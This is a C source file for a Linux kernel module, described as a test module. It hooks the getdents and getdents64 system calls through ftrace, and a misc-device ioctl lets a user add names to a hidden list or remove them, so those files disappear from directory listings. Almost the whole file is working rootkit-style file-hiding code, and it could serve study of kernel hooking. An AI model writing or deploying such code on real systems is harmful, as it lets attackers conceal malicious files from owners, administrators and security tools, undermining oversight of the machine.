#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/miscdevice.h>

#include "ftrace.h"
#include "common.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ivan Briukhov");
MODULE_DESCRIPTION("test kernel module");

#define MAX_HIDDEN_ENTRIES 64

struct hidden_file {
    char name[MAX_HIDDEN_NAME];
    struct list_head list;
};

static LIST_HEAD(hidden_files);
static int hidden_file_count = 0;

// original syscalls
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);


// list control functions
static int kernmod_add_hidden_file(const char *name)
{
    struct hidden_file *entry;
    int err = 0;

    if (hidden_file_count >= MAX_HIDDEN_ENTRIES) {
        return -ENOMEM;
    }

    list_for_each_entry(entry, &hidden_files, list) {
        if (strcmp(entry->name, name) == 0) {
            return -EEXIST;
        }
    }

    entry = kmalloc(sizeof(*entry), GFP_KERNEL);
    if (!entry) {
        return -ENOMEM;
    }

    strscpy(entry->name, name, MAX_HIDDEN_NAME);
    list_add_tail(&entry->list, &hidden_files);
    hidden_file_count++;

    pr_info("kernmod: hiding file '%s'\n", name);

    return err;
}

static int kernmod_remove_hidden_file(const char *name)
{
    struct hidden_file *entry, *tmp;
    int err = -ENOENT;

    list_for_each_entry_safe(entry, tmp, &hidden_files, list) {
        if (strcmp(entry->name, name) == 0) {
            list_del(&entry->list);
            kfree(entry);
            hidden_file_count--;
            pr_info("kernmod: unhiding file '%s'\n", name);
            err = 0;
            return err;
        }
    }
    return err;  
}

// helper functions for hooks
static bool should_hide_dirent(const char *name)
{
    bool result = false;
    struct hidden_file *entry;

    list_for_each_entry(entry, &hidden_files, list) {
        if (strcmp(entry->name, name) == 0) {
            result = true;
            break;
        }
    }
    return result;
}

// hooks for syscalls
static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *user_dirent;
    struct linux_dirent64 *kern_dirent, *cur, *prev;
    long ret, new_ret;
    unsigned long offset;

    ret = orig_getdents64(regs);
    if (ret <= 0)
        return ret;

    user_dirent = (struct linux_dirent64 __user *)regs->si;

    if (list_empty(&hidden_files))
        return ret;

    kern_dirent = kvmalloc(ret, GFP_KERNEL);
    if (!kern_dirent)
        return ret;

    if (copy_from_user(kern_dirent, user_dirent, ret)) {
        kvfree(kern_dirent);
        return ret;
    }

    new_ret = ret;
    prev = NULL;
    offset = 0;

    while (offset < new_ret) {
        cur = (struct linux_dirent64 *)((char *)kern_dirent + offset);

        if (should_hide_dirent(cur->d_name)) {
            pr_info("kernmod: filtering dirent: '%s'\n", cur->d_name);

            if (prev) {
                prev->d_reclen += cur->d_reclen;
            } else {
                new_ret -= cur->d_reclen;
                memmove(cur,
                        (char *)cur + cur->d_reclen,
                        new_ret - offset);
                continue;
            }
        } else {
            prev = cur;
        }

        offset += cur->d_reclen;
    }

    if (copy_to_user(user_dirent, kern_dirent, new_ret)) {
        kvfree(kern_dirent);
        return ret;
    }

    kvfree(kern_dirent);
    return new_ret;
}

struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
};

static asmlinkage long hook_getdents(const struct pt_regs *regs)
{
    struct linux_dirent __user *user_dirent;
    struct linux_dirent *kern_dirent, *cur, *prev;
    long ret, new_ret;
    unsigned long offset;

    ret = orig_getdents(regs);
    if (ret <= 0)
        return ret;

    user_dirent = (struct linux_dirent __user *)regs->si;

    if (list_empty(&hidden_files))
        return ret;

    kern_dirent = kvmalloc(ret, GFP_KERNEL);
    if (!kern_dirent)
        return ret;

    if (copy_from_user(kern_dirent, user_dirent, ret)) {
        kvfree(kern_dirent);
        return ret;
    }

    new_ret = ret;
    prev = NULL;
    offset = 0;

    while (offset < new_ret) {
        cur = (struct linux_dirent *)((char *)kern_dirent + offset);

        if (should_hide_dirent(cur->d_name)) {
            if (prev) {
                prev->d_reclen += cur->d_reclen;
            } else {
                new_ret -= cur->d_reclen;
                memmove(cur,
                        (char *)cur + cur->d_reclen,
                        new_ret - offset);
                continue;
            }
        } else {
            prev = cur;
        }

        offset += cur->d_reclen;
    }

    if (copy_to_user(user_dirent, kern_dirent, new_ret)) {
        kvfree(kern_dirent);
        return ret;
    }

    kvfree(kern_dirent);
    return new_ret;
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents",   hook_getdents,   &orig_getdents),
};

// ioctl handler
static long kernmod_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    char buf[MAX_HIDDEN_NAME] = {0};

    switch (cmd) {
    case IOCTL_HIDE_FILE:
        if (copy_from_user(buf, (char __user *)arg, MAX_HIDDEN_NAME))
            return -EFAULT;
        buf[MAX_HIDDEN_NAME - 1] = '\0';
        return kernmod_add_hidden_file(buf); 

    case IOCTL_UNHIDE_FILE:
        if (copy_from_user(buf, (char __user *)arg, MAX_HIDDEN_NAME))
            return -EFAULT;
        buf[MAX_HIDDEN_NAME - 1] = '\0';
        return kernmod_remove_hidden_file(buf);
    default:
        return -EINVAL;
    }
}

static const struct file_operations kernmod_fops = {
    .owner = THIS_MODULE,
    .unlocked_ioctl = kernmod_ioctl,
};

static struct miscdevice kernmod_dev = {
    .minor = MISC_DYNAMIC_MINOR,
    .name = "kernmod",
    .fops = &kernmod_fops,
    .mode = 0660,
};

// init / exit
static int __init kernmod_init(void)
{
    int err;

    err = misc_register(&kernmod_dev);
    if (err) {
        pr_err("kernmod: misc_register failed: %d\n", err);
        return err;
    }

    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        pr_err("kernmod: fh_install_hooks failed: %d\n", err);
        misc_deregister(&kernmod_dev);
        return err;
    }

    pr_info("kernmod: module loaded\n");
    return 0;
}

static void __exit kernmod_exit(void)
{
    struct hidden_file *fentry, *ftmp;

    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));

    list_for_each_entry_safe(fentry, ftmp, &hidden_files, list) {
        list_del(&fentry->list);
        kfree(fentry);
    }

    misc_deregister(&kernmod_dev);

    pr_info("kernmod: module unloaded\n");
}

module_init(kernmod_init);
module_exit(kernmod_exit);